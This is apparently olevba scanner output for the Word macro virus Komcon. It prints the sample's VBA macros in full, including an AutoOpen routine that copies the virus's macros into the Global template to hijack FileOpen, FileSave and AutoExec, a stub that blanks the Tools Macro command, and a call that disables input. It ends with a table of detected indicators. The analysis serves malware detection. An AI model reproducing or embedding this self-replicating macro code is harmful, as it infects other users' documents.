olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Komcon-c9cb3c05f1a253e5b0df1d1043231f133eb056c6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Komcon-c9cb3c05f1a253e5b0df1d1043231f133eb056c6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Komcon-c9cb3c05f1a253e5b0df1d1043231f133eb056c6 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim sMe$
Dim sTMacro$
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy sTMacro$, "Global:JJAO"
sTMacro$ = sMe$ + ":JJTM"
WordBasic.MacroCopy sTMacro$, "Global:ToolsMacro"
sTMacro$ = sMe$ + ":JJFO"
WordBasic.MacroCopy sTMacro$, "Global:FileOpen"
sTMacro$ = sMe$ + ":JJAE"
WordBasic.MacroCopy sTMacro$, "Global:AutoExec"
sTMacro$ = sMe$ + ":JJFS"
WordBasic.MacroCopy sTMacro$, "Global:FileSave"
WordBasic.FileSaveAll 1, 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO JJTM.bas 
in file: Virus.MSWord.Komcon-c9cb3c05f1a253e5b0df1d1043231f133eb056c6 - OLE stream: 'Macros/VBA/JJTM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Runs, creates, deletes or revises a macro"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.JJTM.MAIN"
Rem
End Sub
-------------------------------------------------------------------------------
VBA MACRO JJAE.bas 
in file: Virus.MSWord.Komcon-c9cb3c05f1a253e5b0df1d1043231f133eb056c6 - OLE stream: 'Macros/VBA/JJAE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Runs AutoOpenScan"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.JJAE.MAIN"
WordBasic.DisableInput 1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

